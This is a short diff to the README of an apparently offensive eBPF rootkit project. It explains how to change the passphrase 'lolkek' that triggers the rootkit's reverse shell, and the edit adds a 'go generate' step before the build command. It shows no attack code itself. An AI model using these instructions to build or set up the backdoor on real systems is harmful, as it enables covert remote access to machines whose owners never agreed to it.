@@ -95,7 +95,7 @@ for (int i = 0; i < 27; i++) {
 **To change the passphrase, replace the string `lolkek` with your own phrase. This phrase is used as a trigger to launch the reverse shell. And the number of bytes to be received.**
 
 After changing the passphrase, you need to rebuild the project:
-
+`go generate`
 `go build -o ebpf-rootkit`
 
 
